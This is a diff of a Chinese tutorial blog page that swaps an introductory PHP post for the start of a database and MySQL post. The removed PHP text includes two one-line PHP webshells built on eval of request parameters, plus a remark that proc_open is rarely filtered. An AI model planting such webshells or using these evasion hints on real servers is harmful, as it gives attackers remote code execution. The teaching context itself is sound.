@@ -130,7 +130,7 @@
   
   <article class="article post card animate" itemscope="" itemtype="http://schema.org/Article">
     <div class="post-block">
-      <link itemprop="mainEntityOfPage" href="https://TuringGu.github.io/2018/12/12/PHP/">
+      <link itemprop="mainEntityOfPage" href="https://TuringGu.github.io/2018/12/15/DB-SQL/">
       <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
         <meta itemprop="name" content="TuringGu">
         <meta itemprop="description" content="">
@@ -142,12 +142,12 @@
     </div>
     <header class="post-header">
       <h1 class="post-title" itemprop="name headline">
-        <a class="post-title-link post-title-link-external" href="/2018/12/12/PHP/" itemprop="url">PHP开发入门</a>
+        <a class="post-title-link post-title-link-external" href="/2018/12/15/DB-SQL/" itemprop="url">数据库和SQL</a>
       </h1>
       <div class="post-meta">
         
         <span class="post-date">
-          <i class="far fa-calendar-plus"></i><span><time title="post-date" itemprop="dateCreated datePublished" datetime="2018-12-12T19:38:53+08:00">2018-12-12 19:38:53</time></span>
+          <i class="far fa-calendar-plus"></i><span><time title="post-date" itemprop="dateCreated datePublished" datetime="2018-12-15T12:39:57+08:00">2018-12-15 12:39:57</time></span>
         </span>
         
         
@@ -156,260 +156,42 @@
     </header>
     <main class="post-main" itemprop="articleBody">
       
-      <h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>本文主要为后端开发做个引子，对常见的或者常用的知识做个简介，包括PHP等一些入门级知识。</p>
-<p><strong>注：补充知识放在文末</strong></p>
-<hr>
-<h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><h3 id="定义与概念"><a href="#定义与概念" class="headerlink" title="定义与概念"></a>定义与概念</h3><ul>
-<li>PHP是嵌入HTML页面中的脚本语言</li>
-<li>是目前最流行的网站开发语言</li>
-<li>在几乎所有的平台中都可以运行</li>
-<li>很多的企业都在使用PHP作为开发语言</li>
+      <h2 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h2><h3 id="定义与概念"><a href="#定义与概念" class="headerlink" title="定义与概念"></a>定义与概念</h3><p>数据库是为了解决数据集中管理上的缺陷而开发出来的数据存储、取用、新增、删除的管理软件，其本质也是对文件进行操作。它的出现使得开发者无需关心它本身如何实现数据管理，只需关注数据本身即可，极大缩短了开发周期。</p>
+<h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><p>数据库分为很多类型与发行版本，常分为：</p>
+<ul>
+<li>层次式</li>
+<li>网络式</li>
+<li>关系型</li>
+</ul>
+<p>而不同的数据库是按不同的数据结构来联系和组织的，在当今互联网中，最常见的数据库模型主要分两种：</p>
+<ul>
+<li>关系型</li>
+<li>非关系型</li>
 </ul>
 <hr>
-<h3 id="Windows10-Sublime配置"><a href="#Windows10-Sublime配置" class="headerlink" title="Windows10 Sublime配置"></a>Windows10 Sublime配置</h3><p><a href="http://www.sublimetext.com/" target="_blank" rel="noopener">Sublime官网</a><br>这里选择windows版下载安装。<br>步骤如下：</p>
-<ol>
-<li>打开Sublime编辑器，输入如下代码：<figure class="hljs highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs undefined">&#123;<br>	<span class="hljs-attr">"cmd"</span>: [<span class="hljs-string">"php"</span>, <span class="hljs-string">"$file"</span>],<br>	<span class="hljs-attr">"file_regex"</span>: <span class="hljs-string">"php$"</span>,<br>	<span class="hljs-attr">"selector"</span>: <span class="hljs-string">"source.php"</span><br>&#125;<br></code></pre></td></tr></table></figure>
-</li>
-</ol>
-<p>一般保存至默认路径即可，如若默认路径有变，则手动选择如下路径：<br><code>C:\User(用户)\{YourName}\AppData\Roaming\Sublime Text3\Packages\User\</code></p>
-<ol start="2">
-<li>添加PHP环境变量：<br>在<a href="http://phpstudy.php.cn/" target="_blank" rel="noopener">phpStudy安装</a>目录中，找到php目录下你想使用的对应php版本，比如这里我选择php-7.0.12-nts。<br>进入文件夹，复制路径。</li>
-</ol>
-<p>打开系统环境变量添加所复制的路径，这里我使用如下方法：</p>
-<blockquote>
-<p>右击计算机–&gt;属性–&gt;高级系统设置–&gt;环境变量–&gt;系统变量</p>
-</blockquote>
-<p>找到变量Path，编辑并新建值，复制php路径，确认并退出。</p>
-<ol start="3">
-<li><p>在Sublime编辑器选项卡中依次打开：<br><code>Tools--&gt;Build System--&gt;php</code><br>这里会出现<code>php</code>选项，是由于第一步文件的配置以及第二步环境变量配置均无误，否则将不会出现这个选项。</p>
-</li>
-<li><p>配置完成<br>快捷键：<code>Ctrl + b</code>即可输出显示php被解释后的运行结果。</p>
-</li>
+<h3 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h3><h4 id="基本格式"><a href="#基本格式" class="headerlink" title="基本格式"></a>基本格式</h4><ol>
+<li>数据以表格的形式出现</li>
+<li>每行为各种记录名称</li>
+<li>每列为记录名称所对应的数据域</li>
+<li>许多的行和列组成一张表单</li>
+<li>若干的表单组成database</li>
 </ol>
 <hr>
-<h3 id="基础规范"><a href="#基础规范" class="headerlink" title="基础规范"></a>基础规范</h3><blockquote>
-<ol>
-<li>PHP脚本以<code>&lt;?php</code>开始，以<code>?&gt;</code>结束为规范写法。若为最后一行，可以省略<code>?&gt;</code></li>
-<li>PHP 脚本可以单独存在，也可以与html页面结合</li>
-<li>php文件扩展名规范，一般是<code>.php</code>结尾。但是，也可以使用其他命名，如<code>.phtml</code>等，具体是定义在配置文件中的。</li>
-</ol>
-</blockquote>
+<h4 id="常用关键词"><a href="#常用关键词" class="headerlink" title="常用关键词"></a>常用关键词</h4><p><strong>数据库</strong>：一些关联表的集合<br><strong>数据表</strong>：表是数据的矩阵。在一个数据库中的表看起来像是一个简单的电子表格<br><strong>列</strong>：一列（数据元素）包含了相同的数据<br><strong>行</strong>：一行（=元组，或记录）是一组相关的数据<br><strong>主键</strong>：具有唯一性。一个数据包只能包含一个主键。可使用主键来查询数据<br><strong>索引</strong>：使用索引可快速访问数据库表中的特定信息。索引是对数据库表中一列或多列的值进行排序的一种结构。类似于书籍的目录</p>
 <hr>
-<h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><blockquote>
-<p>布尔类型<code>（bool）</code><br>整型<code>（int）</code><br>浮点型<code>（float）</code><br>字符串<code>（string)</code><br>资源<code>（resource）</code><br>空类型<code>（NULL）</code><br>数组<code>（array）</code><br>对象<code>（class）</code></p>
-</blockquote>
-<p>一般可使用<code>var_dump()</code>来查看类型</p>
-<h3 id="变量与常量"><a href="#变量与常量" class="headerlink" title="变量与常量"></a>变量与常量</h3><p>常量：</p>
+<h4 id="MySQL安装登陆"><a href="#MySQL安装登陆" class="headerlink" title="MySQL安装登陆"></a>MySQL安装登陆</h4><p>安装：</p>
 <blockquote>
-<p>一旦赋值不会改变，且应尽量使用大写。<br>常量分为系统常量和自定义常量。<br>系统常量可以理解为值不会有改变的量</p>
+<p>通过<code>apt-get</code>安装在ubuntu系统中<br>通过<code>yum</code>安装在centos系统中<br>通过<code>phpstudy</code>运行在windows中（或mysql官网的独立安装包）</p>
 </blockquote>
-<p>定义常量</p>
+<p>登陆：</p>
 <blockquote>
-<p>使用PHP中的函数<code>define()</code>定义自定义常量<br>常量在使用时，不需要<code>$</code>符号<br>常用定义：<code>Define(&#39;ROOT&#39;,&#39;localhost&#39;);</code></p>
-</blockquote>
-<p>常用系统常量：</p>
-<blockquote>
-<p><code>__FILE__</code>：php程序文件名/绝对路径<br><code>__DIR__</code>：被调用的文件脚本所在目录<br><code>__FUNCTION__</code>：函数名<br><code>__LINE__</code>：PHP程序文件行数<br><code>PHP_VERSION</code>：当前解析器的版本号<br><code>PHP_OS</code>：执行当前PHP版本的操作系统名称</p>
+<p>在Linux中通过<code>mysql -u username -p</code>方式登陆<br>在windows中可以使用命令行登陆，和linux一样。也可使用phpstudy自带图形化工具链接数据库。或使用navicat工具登陆。</p>
 </blockquote>
 <hr>
-<p>变量：</p>
-<blockquote>
-<p>变量以<code>$</code>符开始，后面跟着变量名称<br>变量必须以字母或下划线字符开始、只能包含字母数字字符以及下划线（A-z、0-9和_）<br>变量名不能包含空格，且区分大小写。</p>
-</blockquote>
-<hr>
-<h3 id="输入输出"><a href="#输入输出" class="headerlink" title="输入输出"></a>输入输出</h3><p>输出：<br><code>echo、print、printf、sprintf、print_r、die、var_dump</code></p>
-<p>输入：<br>cli命令行模式接收参数：三种方式</p>
-<blockquote>
-<p>使用argv数组、使用getopt方法、提示用户输入</p>
-</blockquote>
-<p>argv：<br><figure class="hljs highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs undefined"><span class="php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">/**<br> * 使用 $argc $argv 接受参数<br> */</span><br> <br><span class="hljs-keyword">echo</span> <span class="hljs-string">"接收到&#123;$argc&#125;个参数"</span>;<br>print_r($argv);<br><span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></table></figure></p>
-<p>getopt:<br><figure class="hljs highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs undefined"><span class="php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">/**<br> * 使用 getopt函数<br> */</span><br> <br>$param_arr = getopt(<span class="hljs-string">'a:b:'</span>);<br>print_r($param_arr);<br><span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></table></figure></p>
-<p>提示用户输入：<br><figure class="hljs highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs undefined"><span class="php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">/**<br> * 提示用户输入，类似Python<br> */</span><br>fwrite(STDOUT,<span class="hljs-string">'请输入您的博客名：'</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">'您输入的信息是：'</span>.fgets(STDIN);<br><span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></table></figure></p>
-<p><strong>php的单双引号都能输出字符串，双引号中内部变量会解析，但在单引号中不会。</strong></p>
-<hr>
-<h3 id="EOF"><a href="#EOF" class="headerlink" title="EOF"></a>EOF</h3><p>PHP EOF(heredoc)是一种在命令行shell（如sh、csh、ksh、bash、PowerShell和zsh）和程序语言（像Perl、PHP、Python和Ruby）里定义一个字串的方法。</p>
-<p>使用概述：</p>
-<blockquote>
-<ol>
-<li>必须后接分号，否则编译不通过</li>
-<li>EOF可以用任意其它字符代替，只需保证结束标识与开始标识一致</li>
-<li>结束标识必须顶格独自占一行，前后不能衔接任何空白字符</li>
-<li>开始标识可以不单引号或双引号，不带引号与带双引号效果一致，均解释内嵌的变量和转义符号，但带单引号则不解释。</li>
-<li>当内容需要内嵌引号（单、双引号）时，不需要加转义符，本身对单双引号转义。</li>
-</ol>
-</blockquote>
-<hr>
-<h3 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h3><p>比较运算符：</p>
-<blockquote>
-<p>大于、小于、等于等运算，它们的结果都是bool值类型</p>
-</blockquote>
-<p>逻辑运算符：</p>
-<blockquote>
-<p>与或非运算<br>and或&amp;&amp;    or或||    not或!<br>它们的结果都是bool值</p>
-</blockquote>
-<hr>
-<h3 id="字符串操作"><a href="#字符串操作" class="headerlink" title="字符串操作"></a>字符串操作</h3><p>常用字符串操作：</p>
-<blockquote>
-<p><code>.</code> 拼接运算符<br><code>addslashes()</code> 将预定义的字符（可能出现歧义的字符）添加反斜杠转义<code>\</code><br><code>bin2hex()</code> 将ASCII字符串转换为16进制<br><code>chr()</code> 将指定的ASCII值转换成字符<br><code>chop()</code> 移除字符串右侧字符，由自己指定，默认为空白字符<br><code>strlen() mb_strlen()</code> 长度计算，区别：<code>mb_strlen</code>可以计算中文字符串长度<br><code>crypt()</code> 对字符串单项加密，不可逆转，类似于做MD5值<br><code>htmlentities()</code> 将字符串转换为html实体(可用于防御xss攻击)<br>例如：<br><figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> htmlentities(<span class="hljs-string">"&lt;script&gt;alert(1)&lt;/script&gt;"</span>);<br></code></pre></td></tr></table></figure></p>
-</blockquote>
-<blockquote>
-<p><code>implode()</code> 返回一个由数组元素组合成的字符串，与<code>explode()</code>作用相反<br><code>md5()</code> 计算字符串的MD5值<br><code>md5_file()</code> 计算文件的MD5值<br><code>str_replace()</code> 替换字符串中的一部分（大小写<strong>敏感</strong>）<br><code>str_ireplace()</code> 替换字符串中的一部分（大小写<strong>不敏感</strong>）<br><code>str_split()</code> 把字符串分割到数组中，php4/5/7均支持，但无法按照指定的字符来做分割，split函数可以按照指定的字符来分割，与explode函数用法类似，split函数仅可在php4/5中使用，php7废除了此用法<br><code>strcmp</code> 比较两个字符串（大小写<strong>敏感</strong>）</p>
-<blockquote>
-<p>在<code>UTF-8</code>中，每个中文3字节<br>在<code>GBK</code>中，每个中文2字节<br>无论什么编码，英文每个字母占1字节</p>
-</blockquote>
-</blockquote>
-<hr>
-<h3 id="类型转换"><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h3><ul>
-<li><p>强制转换：(数据类型)数据变量</p>
-<figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">(int)$var  (string)$var  (float)$var  (bool)$var<br></code></pre></td></tr></table></figure>
-</li>
-<li><p>使用具体类型函数转换</p>
-<figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">intval()  floatval()  strval()<br></code></pre></td></tr></table></figure>
-</li>
-<li><p>使用通用类型转换函数</p>
-<figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">settype(mixed <span class="hljs-keyword">var</span>, string type)<br></code></pre></td></tr></table></figure>
-</li>
-</ul>
-<hr>
-<h3 id="PHP是弱类型"><a href="#PHP是弱类型" class="headerlink" title="PHP是弱类型"></a>PHP是弱类型</h3><figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">$a = <span class="hljs-number">1</span>;  $b = <span class="hljs-keyword">true</span>;<br>var_dump($a == $b);  <span class="hljs-comment">// 结果为true</span><br><br>var_dump((int)$b);<br>var_dump((int)str_replace(<span class="hljs-string">"1"</span>, <span class="hljs-string">""</span>, $a));<br></code></pre></td></tr></table></figure>
-<hr>
-<h3 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h3><h4 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h4><p>数组是特殊的变量，可以在单个变量中同时保存一个或一个以上的值，并可以同通过下标来访问其中某一个的值。用<code>array()</code>函数创建。同时PHP中数组可以存储任意类型的数据。<br><figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">$arr = <span class="hljs-keyword">array</span>(<span class="hljs-string">'I am'</span>, <span class="hljs-string">'a'</span>, <span class="hljs-string">'array'</span>);<br></code></pre></td></tr></table></figure></p>
-<p>PHP中数组可分为索引数组和关联数组，第三种叫多维数组</p>
-<blockquote>
-<p>索引数组：是指数组的键是整数的数组，且键的整数顺序从<code>0</code>开始<br>关联数组：是一种具有特殊索引方式的数组。不仅可以通过整数来索引它，还可以使用字符串或者其他类型的值（除了NULL）来索引它。</p>
-</blockquote>
-<hr>
-<h4 id="赋值方式："><a href="#赋值方式：" class="headerlink" title="赋值方式："></a>赋值方式：</h4><ol>
-<li>数组变量名后加一个中括号的方式赋值。且键一定为整数。<br><code>$a[1] = 0</code></li>
-<li>用<code>array()</code>创建一个空数组，用<code>=&gt;</code>分隔左侧键和右侧值。</li>
-<li>用<code>array()</code>创建一个空数组，直接在数组里用英文单引号或双引号赋值，数组会默认建立从0开始的整数的键</li>
-</ol>
-<h4 id="输出方式"><a href="#输出方式" class="headerlink" title="输出方式"></a>输出方式</h4><p>常用：</p>
-<ol>
-<li><p>直接使用键输出：</p>
-<figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    $score = <span class="hljs-keyword">array</span>(<span class="hljs-string">"Math"</span> =&gt; <span class="hljs-string">"数学"</span>);<br>    $scoreMaths = $score[<span class="hljs-string">"Maths"</span>];<br>    <span class="hljs-keyword">echo</span> $scoreMaths;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
-</li>
-<li><p>使用foreach输出：</p>
-<figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    $project = <span class="hljs-keyword">array</span>(<br>        <span class="hljs-string">"china"</span> =&gt; <span class="hljs-string">"语文"</span>,<br>        <span class="hljs-string">"Maths"</span> =&gt; <span class="hljs-string">"数学"</span>,<br>        <span class="hljs-string">"English"</span> =&gt; <span class="hljs-string">"英语"</span><br>    );<br><br>    <span class="hljs-keyword">foreach</span> ($project <span class="hljs-keyword">as</span> $key =&gt; $value) &#123;<br>    	<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br /&gt;"</span>;<br>    	<span class="hljs-keyword">echo</span> $key.<span class="hljs-string">"是"</span>.$value.<span class="hljs-string">"。"</span>;<br>    &#125;<br>    <span class="hljs-keyword">echo</span> $project[<span class="hljs-string">"Maths"</span>];<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
-</li>
-</ol>
-<hr>
-<h4 id="常用操作技巧"><a href="#常用操作技巧" class="headerlink" title="常用操作技巧"></a>常用操作技巧</h4><ul>
-<li><code>count()</code>和<code>sizeof()</code> 统计数组下标个数，获取数组长度</li>
-<li><code>each()</code> 返回当前元素键名和键值，并将内部指针向前移动</li>
-<li><code>list()</code> 用于在一次操作中给一组变量赋值</li>
-<li><code>sort()、asort()、ksort()</code> 正向排序</li>
-<li><code>rsort()、arsort()、krsort()</code> 反向排序</li>
-<li><code>array_count_values()</code> 统计数组下标值的个数</li>
-<li><code>current()</code> 每个数组都有一个内部指针指向他的当前单元，初始指向插入到数组中的第一个元素</li>
-<li><code>array_pad()</code> 数组之间首尾选择性追加</li>
-<li><code>unset()</code> 销毁指定的变量</li>
-<li><code>array_fill()</code> 用键值填充数组</li>
-<li><code>array_combine()</code> 同过合并两个数组来创建一个新数组，其中一个数组元素为键名，另一个为键值</li>
-<li><code>array_splice()</code> 从数组中移除元素，并用新元素取代它</li>
-<li><code>array_unique()</code> 删除数组中重复值</li>
-<li><code>array_flip()</code> 交换数组的键值和值</li>
-<li><code>array_search()</code> 搜索数值</li>
-</ul>
-<hr>
-<h4 id="函数参数"><a href="#函数参数" class="headerlink" title="函数参数"></a>函数参数</h4><p>通过参数列表可以传递信息到函数（以逗号作为分隔符）的表达式列表。参数类似于一个变量，通过传递参数可以使函数实现对参数的运算。<br>参数可以是任意类型的数据，具体要根据函数功能来确定。</p>
-<hr>
-<h4 id="内置函数"><a href="#内置函数" class="headerlink" title="内置函数"></a>内置函数</h4><p>常见：<br><code>isset()</code> 判断变量是否存在<br><code>strlen()</code> 计算字符串长度<br><code>var_dump()</code> 输出变量类型和具体内容（常用于调试）<br><code>mysql_connect()</code> 链接数据库<br><code>function_exists()</code> 判断函数是否存在</p>
-<hr>
-<h4 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h4><p>编写一个函数，实现计算两个数大小比较，并返回最大值：<br><figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// return the max of the two</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">maxofmine</span><span class="hljs-params">($a, $b)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span>($a &lt; $b) &#123;<br>        <span class="hljs-keyword">return</span> $b;<br>    &#125;<span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> $a;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></p>
-<p>编写一个函数，实现将两个数的值进行交换，无返回值：<br><figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// swap two variable's value</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">swap</span><span class="hljs-params">(&amp;$a, &amp;$b)</span> </span>&#123;<br>    $tmp = $a;  $a = $b;  $b = $tmp;<br>&#125;<br></code></pre></td></tr></table></figure></p>
-<p>用函数实现<code>array_flip()</code><br><figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// function array_flip() implementation</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">array_flip_mine</span><span class="hljs-params">($array)</span> </span>&#123;<br>    <span class="hljs-keyword">foreach</span> ($array <span class="hljs-keyword">as</span> $key =&gt; $value) &#123;<br>        $arraytmp[] = <span class="hljs-keyword">array</span>($value =&gt; $key);<br>    &#125;<br>    <span class="hljs-keyword">return</span> $arraytmp;<br>&#125;<br></code></pre></td></tr></table></figure></p>
-<hr>
-<h3 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h3><h4 id="打开"><a href="#打开" class="headerlink" title="打开"></a>打开</h4><p><code>fopen()</code>方式打开文件</p>
-<table>
-<thead>
-<tr>
-<th><strong>参数</strong></th>
-<th><strong>含义</strong></th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>‘r’</td>
-<td>只读方式打开，将文件指针指向文件头</td>
-</tr>
-<tr>
-<td>‘r+’</td>
-<td>读写方式打开，将文件指针指向文件头</td>
-</tr>
-<tr>
-<td>‘w’</td>
-<td>写入方式打开，将文件指针指向文件头并将文件大小截为零。若文件不存在则尝试创建</td>
-</tr>
-<tr>
-<td>‘w+’</td>
-<td>读写方式打开，将文件指针指向文件头并将文件大小截为零。若文件不存在则尝试创建</td>
-</tr>
-<tr>
-<td>‘a’</td>
-<td>写入方式打开，将文件指针指向文件末尾。若文件不存在则尝试创建</td>
-</tr>
-<tr>
-<td>‘a+’</td>
-<td>读写方式打开，将文件指针指向文件末尾。若文件不存在则尝试创建</td>
-</tr>
-</tbody>
-</table>
-<hr>
-<h4 id="读取"><a href="#读取" class="headerlink" title="读取"></a>读取</h4><p><code>fread()</code> 读取指定长度的字符串<br><code>fgets()</code> 读取文件一行内容，并将指针下移一行<br><code>file_get_contents()</code> 读取文件全部内容<br><code>feof()</code> 检测文件指针是否已到达文件末尾</p>
-<h4 id="写入"><a href="#写入" class="headerlink" title="写入"></a>写入</h4><p><code>fwrite()</code> 写入数据</p>
-<h4 id="关闭"><a href="#关闭" class="headerlink" title="关闭"></a>关闭</h4><p><code>fclose()</code> 关闭文件</p>
-<h4 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h4><p><code>filesize()</code> 获取文件大小<br><code>is_readable()</code>和<code>is_writeable()</code> 判断文件在是否存在的基础上，是否可读或可写<br><code>is_file</code>和<code>file_exists</code> 判断指定路径是否存在某个文件</p>
-<hr>
-<h3 id="简单命令执行"><a href="#简单命令执行" class="headerlink" title="简单命令执行"></a>简单命令执行</h3><p>PHP中执行PHP代码<br><code>eval()、assert()</code></p>
-<p>PHP中执行系统命令：<br><code>system()</code> 输出并返回最后一行<code>shell</code>结果<br><code>exec()</code> 不输出结果，返回最后一行<code>shell</code>结果，所有结果可以保存到一个返回的数组里面<br><code>passthru()</code> 只调用命令，把命令的运行结果原样直接输出至标准输出设备上</p>
-<p>其他：<br><code>popen()、shell_exec()、proc_open()、pcntl_exec()</code><br>反引号实际上使用的shell_exec</p>
-<p>一些例子：<br><code>exec()</code>：<br><figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">exec(<span class="hljs-string">'dir'</span>, $a);  <span class="hljs-comment">// exec返回值是一个数组</span><br><span class="hljs-keyword">foreach</span> ($a <span class="hljs-keyword">as</span> $key =&gt; $value) &#123;<br>    <span class="hljs-keyword">echo</span> $value.<span class="hljs-string">"&lt;br&gt;"</span>;<br>&#125;<br></code></pre></td></tr></table></figure></p>
-<p><code>proc_open</code>（很少被过滤）：<br><figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php">$arrayName = <span class="hljs-keyword">array</span>(<br>    <span class="hljs-number">0</span> =&gt; <span class="hljs-keyword">array</span>(<span class="hljs-string">"pipe"</span>, <span class="hljs-string">"r"</span>),<br>    <span class="hljs-number">1</span> =&gt; <span class="hljs-keyword">array</span>(<span class="hljs-string">"pipe"</span>, <span class="hljs-string">"w"</span>),<br>    <span class="hljs-number">2</span> =&gt; <span class="hljs-keyword">array</span>(<span class="hljs-string">"file"</span>, <span class="hljs-string">"./tmp-error-output.txt"</span>, <span class="hljs-string">"a"</span>)<br>);<br><br>proc_open(<span class="hljs-string">'dir'</span>, $array, $pipes);<br><span class="hljs-keyword">foreach</span> ($pipes <span class="hljs-keyword">as</span> $key =&gt; $value) &#123;<br>    <span class="hljs-keyword">while</span>(!feof($value)) &#123;<br>        <span class="hljs-keyword">echo</span> fgets($file);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></p>
-<h4 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h4><p>PHP脚本版：<br><figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>($_GET[<span class="hljs-string">'a'</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure></p>
-<p>Java脚本版（C🔪）：<br><figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>($_POST[<span class="hljs-string">'a'</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure></p>
-<hr>
-<h3 id="文件的包含"><a href="#文件的包含" class="headerlink" title="文件的包含"></a>文件的包含</h3><h4 id="include和require"><a href="#include和require" class="headerlink" title="include和require"></a>include和require</h4><p>通过include或require语句，可将PHP文件的内容插入另一个PHP文件（在服务器执行它之前）<br>异同：</p>
-<blockquote>
-<p><code>include</code>和<code>require</code>语句是相同的，除了错误处理方面：<br><code>require</code>会生成致命错误<code>E_COMPILE_ERROR</code>并停止脚本<br><code>include</code>只生成警告<code>E_WARNING</code>，并且脚本会继续<br><code>include_once</code>和<code>requre_once</code>语句相同，也是除了错误处理方面有所不同，同时，他们只会包含此次，不会重复包含。</p>
-</blockquote>
-<hr>
-<h4 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h4><figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">include</span> <span class="hljs-string">'filename'</span>;  <span class="hljs-comment">// include会在php文件开始运行的时候包含</span><br><span class="hljs-keyword">require</span> <span class="hljs-string">'filename'</span>;  <span class="hljs-comment">// require会在php文件运行到require关键字时包含</span><br><span class="hljs-keyword">include_once</span> <span class="hljs-string">'filename'</span>;<br><span class="hljs-keyword">require_once</span> <span class="hljs-string">'filenmae'</span>;<br></code></pre></td></tr></table></figure>
-<hr>
-<h2 id="补充知识"><a href="#补充知识" class="headerlink" title="补充知识"></a>补充知识</h2><h3 id="解释性语言与编译型语言"><a href="#解释性语言与编译型语言" class="headerlink" title="解释性语言与编译型语言"></a>解释性语言与编译型语言</h3><ol>
-<li><p>解释型语言</p>
-<blockquote>
